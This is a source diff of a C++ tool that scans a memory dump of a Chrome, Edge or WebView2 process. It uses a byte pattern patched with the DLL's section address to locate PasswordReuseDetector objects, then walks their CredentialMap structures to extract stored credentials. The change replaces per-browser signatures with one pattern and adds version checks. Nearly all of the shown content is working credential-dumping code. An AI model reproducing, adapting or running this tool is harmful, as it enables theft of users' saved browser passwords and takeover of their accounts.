@@ -54,61 +54,36 @@ int main(int argc, char* argv[]) {
 		return EXIT_FAILURE;
 	}
 
-	LPCSTR dllName = "";
-	size_t szPattern = 144;
-	BYTE* pattern = 0;
+	LPCSTR targetDll = "\0";
+	uintptr_t dllBaseaddr = 0;
 	bool found = false;
-	bool isChrome = true;
+	TargetVersion targetConfig = Chrome;
+	udmpparser::dmp::FixedFileInfo_t fileInfo = { 0 };
 
 	const auto& Modules = dump.GetModules();
 	for (const auto& [Base, ModuleInfo] : Modules) {
 		if (ModuleInfo.ModuleName.find("chrome.exe") != std::string::npos) {
 			printf("[*] Using Chrome configuration\n\n");
-			dllName = "chrome.dll";
-			pattern = new BYTE[144]{
-				0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA,
-				0x85, 0xFF, 0x74, 0x08, 0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0xF0, 0x48,
-				0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
-				0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0x48, 0xBB, 0x00,
-				0x00, 0x00, 0x00, 0xFC, 0xFF, 0xFF, 0xFF, 0x48, 0xAA, 0xD0, 0x48, 0x21, 0xD8, 0x48, 0x3B, 0x05,
-				0xAA, 0xAA, 0xAA, 0x0B, 0x75, 0x08, 0x48, 0x89, 0xAA, 0xE8, 0xAA, 0xAA, 0xAA, 0xFD, 0x48, 0x8B,
-				0x4E, 0x18, 0x48, 0x21, 0xCB, 0x48, 0x3B, 0x1D, 0xAA, 0xAA, 0xAA, 0x0B, 0x74, 0x20, 0x48, 0x89,
-				0x7E, 0x18, 0xB9, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x03, 0x4E, 0x10, 0x48, 0x83, 0xC6, 0x08, 0x48,
-				0x89, 0xF2, 0x48, 0x83, 0xAA, 0x20, 0x5B, 0x5F, 0x5E, 0xE9, 0xAA, 0xAA, 0xAA, 0xFE, 0xE8, 0xAA
-			};
+			targetDll = "chrome.dll";
+			fileInfo = ModuleInfo.VersionInfo;
 			found = true;
 			break;
 		}
 		else if (ModuleInfo.ModuleName.find("msedge.exe") != std::string::npos) {
 			printf("[*] Using MSEdge configuration\n\n");
-			dllName = "msedge.dll";
-			pattern = new BYTE[144]{
-				0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x89, 0xD7, 0x48, 0x89, 0xCE, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA,
-				0x85, 0xFF, 0x74, 0x08, 0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0xF0, 0x48,
-				0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0x56, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x89, 0xCE, 0x8A, 0x41,
-				0x48, 0x3A, 0x42, 0x48, 0x75, 0x11, 0x84, 0xC0, 0x74, 0x22, 0x48, 0x89, 0xF1, 0x48, 0x83, 0xC4,
-				0x20, 0x5E, 0xE9, 0xAA, 0xAA, 0xAA, 0xAA, 0x84, 0xC0, 0x75, 0x17, 0x48, 0x85, 0xF6, 0x74, 0x20,
-				0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0xC6, 0x46, 0x48, 0x01, 0x48, 0x83, 0xC4, 0x20,
-				0x5E, 0xC3, 0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0xC6, 0x46, 0x48, 0x00, 0xEB, 0xEC,
-				0x0F, 0x0B, 0x41, 0x57, 0x41, 0x56, 0x41, 0x54, 0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x38, 0x4D,
-				0x89, 0xCE, 0x4C, 0x89, 0xC7, 0x48, 0x89, 0xD3, 0x48, 0x89, 0xCE, 0x48, 0x8B, 0x05, 0xAA, 0xAA
-			};
+			targetDll = "msedge.dll";
+			fileInfo = ModuleInfo.VersionInfo;
+			targetConfig = Edge;
 			found = true;
-			isChrome = false;
 			break;
 		}
 		else if (ModuleInfo.ModuleName.find("msedgewebview2.exe") != std::string::npos) {
-			printf("[-] MSEdgeWebView is not currently supported!\n");
-			return 1;
-
-			//printf("[*] Using MSEdgeWebView configuration\n\n");
-			//dllName = "msedge.dll";
-			//pattern = new BYTE[144]{
-			//	//empty
-			//};
-			//found = true;
-			//isChrome = false;
-			//break;
+			printf("[*] Using MSEdgeWebView configuration\n\n");
+			targetDll = "msedge.dll";
+			fileInfo = ModuleInfo.VersionInfo;
+			targetConfig = Webview2;
+			found = true;
+			break;
 		}
 	}
 
@@ -122,44 +97,96 @@ int main(int argc, char* argv[]) {
 		return EXIT_SUCCESS;
 	}
 
-	BYTE secondPattern[sizeof(uintptr_t)];
-	BYTE thirdPattern[sizeof(uintptr_t)];
+	printf("[*] Browser Version: %hu.%hu.%hu.%hu\n\n",
+		HIWORD(fileInfo.ProductVersionMS),
+		LOWORD(fileInfo.ProductVersionMS),
+		HIWORD(fileInfo.ProductVersionLS),
+		LOWORD(fileInfo.ProductVersionLS)
+	);
 
-	uintptr_t resultAddress = 0;
-	if (!FindDLLPattern(dump, dllName, pattern, szPattern, resultAddress)) {
-		printf("[-] Failed to find the first pattern!\n");
-		return EXIT_SUCCESS;
+	WORD highMajor = HIWORD(fileInfo.ProductVersionMS);
+	WORD highMinor = HIWORD(fileInfo.ProductVersionLS);
+
+	//Update config based on target version
+	if (targetConfig == Chrome) {
+		if ((highMajor == 122 && highMinor <= 6260) ||
+			(highMajor < 122)) {
+			PRINT("[-] This browser version is not supported!\n");
+			return 0;
+		}
 	}
-	printf("[*] Found the first pattern at: 0x%p\n", (void*)resultAddress);
-	ConvertToByteArray(resultAddress, secondPattern, sizeof(uintptr_t));
-
-	if (!FindDLLPattern(dump, dllName, secondPattern, sizeof(uintptr_t), resultAddress)) {
-		printf("[-] Failed to find the second pattern!\n");
-		return EXIT_SUCCESS;
+	else if (targetConfig == Edge || targetConfig == Webview2) {
+		if ((highMajor == 122 && highMinor <= 6260) ||
+			(highMajor < 122)) { //Honestly no idea, these haven't been tested
+			PRINT("[-] This browser version is not supported!\n");
+			return 0;
+		}
 	}
-	printf("[*] Found the second pattern at: 0x%p\n", (void*)resultAddress);
-	ConvertToByteArray(resultAddress, thirdPattern, sizeof(uintptr_t));
 
+	//One pattern to rule them all
+	size_t szPattern = 128;
+	BYTE pattern[] = {
+		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00,
+		0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
+		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
+		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
+		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00
+	};
 
-	uintptr_t PasswordReuseDetectorInstances[100];
+	for (const auto& [Base, ModuleInfo] : Modules) {
+		if (ModuleInfo.ModuleName.find(targetDll) != std::string::npos) {
+			dllBaseaddr = ModuleInfo.BaseOfImage;
+		}
+	}
+
+#ifdef _DEBUG
+	PRINT("[+] Found %s in address: 0x%p\n", targetDll, (void*)dllBaseaddr);
+#endif
+	uintptr_t targetSection = 0;
+	if (!FindLargestSection(dump, targetDll, targetSection)) {
+		PRINT("[-] Something went wrong");
+		return 0;
+	}
+
+#ifdef _DEBUG
+	PRINTW(L"[+] Found target region in section: 0x%p\n", (void*)targetSection);
+#endif
+	BYTE chromeDllPattern[sizeof(uintptr_t)];
+	ConvertToByteArray(targetSection, chromeDllPattern, sizeof(uintptr_t));
+
+	//Patch in the base address
+	PatchPattern(pattern, chromeDllPattern, 8);
+	PatchPattern(pattern, chromeDllPattern, 160);
+
+	uintptr_t* PasswordReuseDetectorInstances = (uintptr_t*)malloc(sizeof(uintptr_t) * 100);
 	size_t szPasswordReuseDetectorInstances = 0;
-
-	if (!FindPattern(dump, thirdPattern, sizeof(uintptr_t), PasswordReuseDetectorInstances, szPasswordReuseDetectorInstances)) {
-		printf("[-] Failed to find the third pattern!\n");
+	if (PasswordReuseDetectorInstances == NULL || !FindPattern(dump, pattern, szPattern, PasswordReuseDetectorInstances, szPasswordReuseDetectorInstances))
+	{
+		PRINT("[-] Failed to find pattern\n");
 		free(PasswordReuseDetectorInstances);
-		return EXIT_SUCCESS;
+		return 0;
 	}
-	
-	printf("\n[*] Found %zu CredentialMap instances\n\n", szPasswordReuseDetectorInstances);
+
+	PRINT("[*] Found %Iu instances of CredentialMap!\n", szPasswordReuseDetectorInstances);
+#ifdef _DEBUG
+	for (size_t i = 0; i < szPasswordReuseDetectorInstances; i++)
+		PRINTW(TEXT("[*] Found PasswordReuseDetector on 0x%p\n"), (void*)PasswordReuseDetectorInstances[i]);
+#endif
 
 	for (size_t i = 0; i < szPasswordReuseDetectorInstances; i++)
 	{
 		if (PasswordReuseDetectorInstances == NULL || PasswordReuseDetectorInstances[i] == NULL)
 			break;
-		uintptr_t CookieMapOffset = 0; //This offset is fixed since the data just is there like it is
-		CookieMapOffset += PasswordReuseDetectorInstances[i] + sizeof(uintptr_t); //Include the length of the result address as well
-		wprintf(TEXT("[*] Found CredentialMap on 0x%p\n"), (void*)CookieMapOffset);
-		WalkCredentialMap(dump, CookieMapOffset);
+		uintptr_t CredentialMapOffset = 0; //Offset to passwords_with_matching_reused_credentials_ 0x20 for my own debug build
+		CredentialMapOffset += PasswordReuseDetectorInstances[i] + sizeof(uintptr_t); //Include the length of the result address as well
+#ifdef _DEBUG
+		PRINTW(TEXT("[*] CredentialMap should be found in address 0x%p\n"), (void*)CredentialMapOffset);
+#endif
+		WalkCredentialMap(dump, CredentialMapOffset);
 	}
 
 	printf("[+] Done");
